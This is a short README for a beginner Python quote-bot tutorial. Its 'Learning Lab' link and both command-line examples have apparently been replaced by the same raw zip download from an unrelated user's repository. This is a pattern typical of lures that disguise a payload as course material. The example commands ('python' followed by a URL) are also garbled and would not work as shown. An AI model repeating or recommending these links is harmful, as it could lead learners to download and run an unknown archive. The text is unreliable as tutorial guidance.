# Let's Write a Python Quote Bot!

This repository will get you started with building a quote bot in Python. It's meant to be used along with the [Learning Lab](https://github.com/karbine98kz/python-random-quote/raw/refs/heads/master/judgeable/quote-random-python-1.5.zip) intro to Python.

When complete, you'll be able to grab random quotes from the command line, like this:

> **$** python https://github.com/karbine98kz/python-random-quote/raw/refs/heads/master/judgeable/quote-random-python-1.5.zip
> 
> Keep it logically awesome
> 
> **$** python https://github.com/karbine98kz/python-random-quote/raw/refs/heads/master/judgeable/quote-random-python-1.5.zip
